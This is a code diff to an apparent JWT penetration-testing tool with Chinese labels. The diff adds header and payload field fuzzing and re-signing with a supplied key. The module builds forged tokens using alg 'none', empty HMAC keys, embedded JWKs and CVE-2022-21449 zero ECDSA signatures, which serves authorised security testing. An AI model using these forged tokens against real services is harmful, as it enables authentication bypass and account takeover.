@@ -1,5 +1,6 @@
 import { assemble, b64url, parseJwt, pemBytes, signHmac, signKey } from './jwt.js';
 import { TEST_KEYS } from './keys.js';
+import { signToken } from './crypto-tools.js';
 
 export const CATEGORIES = [
   { id: 'baseline', title: '原始请求基线', tag: 'CONTROL', detail: '保留原始 JWT，用响应对照每个测试。' },
@@ -14,6 +15,7 @@ export const CATEGORIES = [
   { id: 'parser', title: 'Header 与解析差异', tag: 'PARSER', detail: '重复 alg、未知 crit、typ、b64、Base64 填充等变形。' },
   { id: 'ecdsa', title: 'ECDSA 零值签名', tag: 'CVE-2022-21449', detail: 'ES256 / 384 / 512 的 JOSE 全零签名与 DER 变体。' },
   { id: 'custom', title: '自定义 Payload', tag: 'CUSTOM', detail: '使用编辑后的 JSON，组合 none、JWK 与空密钥重新签名。' },
+  { id: 'fuzz', title: '自定义字段 Fuzz', tag: 'FUZZ', detail: '逐行替换 Header / Payload 字段，组合已启用的签名方式。' },
 ];
 
 export async function generatePayloads(input, options = {}) {
@@ -108,10 +110,10 @@ export async function generatePayloads(input, options = {}) {
     add('ecdsa', `${alg} · r=0,s=0 DER`, assemble({ ...h, alg }, p, b64url(new Uint8Array([48, 6, 2, 1, 0, 2, 1, 0]))), '故意使用非 JOSE DER 格式，检测特定实现的兼容行为。');
   }
   if (selected.has('custom')) {
-    if (!options.customPayload?.trim()) warnings.push('已跳过自定义 Payload：尚未填写 JSON。');
+    if (!options.customPayload?.trim() && !options.signWithKey) warnings.push('已跳过自定义 Payload：尚未填写 JSON。');
     else {
       let payload;
-      try { payload = JSON.parse(options.customPayload); } catch { throw new Error('自定义 Payload JSON 无效。'); }
+      try { payload = options.customPayload?.trim() ? JSON.parse(options.customPayload) : p; } catch { throw new Error('自定义 Payload JSON 无效。'); }
       if (!payload || Array.isArray(payload) || typeof payload !== 'object') throw new Error('自定义 Payload 必须是 JSON 对象。');
       add('custom', '自定义 · 原签名', forged(h, payload));
       // Respect disabled categories even when custom claims are enabled.
@@ -120,6 +122,37 @@ export async function generatePayloads(input, options = {}) {
       if (selected.has('jwk')) {
         const key = TEST_KEYS[0];
         add('custom', '自定义 · JWK RS256', await signKey({ ...h, alg: 'RS256', kid: key.jwk.kid, jwk: key.jwk }, payload, key.privatePem));
+      }
+      if (options.signWithKey) {
+        let header;
+        try { header = options.customHeader?.trim() ? JSON.parse(options.customHeader) : h; } catch { throw new Error('Custom Header must be valid JSON.'); }
+        if (!header || Array.isArray(header) || typeof header !== 'object') throw new Error('Custom Header must be a JSON object.');
+        add('custom', 'Custom Header / Payload · supplied signing key', await signToken(header, payload, options.signingKey ?? ''));
+      }
+    }
+  }
+  if (selected.has('fuzz') && options.fuzzField?.trim() && options.fuzzValues?.trim()) {
+    const path = options.fuzzField.trim().split('.');
+    if (path.some(key => !key || ['__proto__', 'constructor', 'prototype'].includes(key))) throw new Error('Fuzz path contains an unsupported property.');
+    const values = options.fuzzValues.split(/\r?\n/).filter(line => line.trim());
+    if (values.length > 50) throw new Error('Fuzzing is limited to 50 values per batch.');
+    for (const line of values) {
+      let value;
+      try { value = JSON.parse(line); } catch { value = line; }
+      const header = structuredClone(h), payload = structuredClone(p);
+      let cursor = options.fuzzPart === 'header' ? header : payload;
+      for (const segment of path.slice(0, -1)) {
+        if (!Object.hasOwn(cursor, segment) || !cursor[segment] || typeof cursor[segment] !== 'object') cursor[segment] = {};
+        cursor = cursor[segment];
+      }
+      cursor[path.at(-1)] = value;
+      const label = `Fuzz ${options.fuzzPart === 'header' ? 'header' : 'payload'}.${path.join('.')} = ${JSON.stringify(value)}`;
+      add('fuzz', `${label} · 原签名`, forged(header, payload));
+      if (selected.has('none')) add('fuzz', `${label} · none`, assemble({ ...header, alg: 'none' }, payload));
+      if (selected.has('hmac')) add('fuzz', `${label} · HS256 空密钥`, await signHmac({ ...header, alg: 'HS256' }, payload, ''));
+      if (options.signWithKey) {
+        try { add('fuzz', `${label} · supplied key`, await signToken(header, payload, options.signingKey ?? '')); }
+        catch (error) { warnings.push(`${label}: ${error.message}`); }
       }
     }
   }
